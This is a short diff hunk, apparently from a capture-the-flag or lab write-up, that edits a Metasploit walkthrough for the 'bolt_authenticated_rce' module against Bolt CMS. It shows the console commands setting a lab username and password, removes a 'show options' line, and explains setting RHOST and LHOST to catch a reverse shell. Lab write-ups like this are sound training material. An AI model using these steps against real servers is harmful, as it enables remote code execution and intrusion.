@@ -120,7 +120,6 @@ msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
 USERNAME => bolt
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123 
 PASSWORD => boltadmin123
-msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options
 </pre>
 #### RHOST is the ip of the machine
 #### LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
